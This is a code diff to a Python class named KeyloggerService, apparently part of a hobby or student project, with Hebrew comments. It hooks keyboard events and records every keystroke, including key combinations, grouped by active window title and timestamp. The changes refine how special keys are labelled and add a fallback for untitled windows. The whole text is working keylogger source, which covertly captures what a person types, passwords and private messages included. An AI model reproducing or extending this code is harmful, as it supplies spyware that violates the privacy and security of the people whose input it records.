@@ -25,14 +25,22 @@ class KeyloggerService:
         keyboard.on_release(self.handle_input)
 
     @staticmethod
-    def get_keyword(key: keyboard.KeyboardEvent) -> str:
+    def get_keyword(key: keyboard.KeyboardEvent) -> str: #קבלת המקש שלחץ עליו
+
+        exchange_name = ["space","backspace"] #מקשים שצריך לשמור בפני עצמם
+
         if len(key.name) > 1:
-            key_array = [value.name for k,value in keyboard._pressed_events.items()]
-            string = "".join(key_array)
-            string += key.name
-            key_name = "~" + string + "~"
+
+            if key.name in exchange_name:
+                return "~" + key.name + "~" #הוספת תו מיוחד למקשים מיוחדים בפני עצמם
+
+            pressed_key_str = [value.name for k,value in keyboard._pressed_events.items()] #קבלת כל המקשים שנלחצו בו זמנית
+            key_name = "".join(pressed_key_str) #חיבור לרץ אחד ארוך
+            key_name += key.name
+            key_name = "~" + key_name + "~" # הוספת תו מיוחד
             return key_name
-        else:
+
+        else:   #אם לחץ על מקש רגיל
             return key.name
 
     @staticmethod
@@ -43,17 +51,21 @@ class KeyloggerService:
 
     @staticmethod
     def get_active_window() ->str:
-        return pw.getActiveWindowTitle()
+        active_window =  pw.getActiveWindowTitle()
+        return active_window if active_window else "unknown window"
 
     def handle_input(self,key) ->None:
+        #מקבל את שם החלון שהוא הקליד בו
         active_window = self.get_active_window()
         if active_window not in self.__data:
             self.__data[active_window] = {}
 
+        #מקבל את הזמן שהוא הקליד בו
         current_time = self.get_time(key)
         if current_time not in self.__data[active_window]:
             self.__data[active_window][current_time] = ''
 
+        #מקבל את המקש שהוא לחץ עליו
         key_name = self.get_keyword(key)
         self.__data[active_window][current_time] += key_name
 
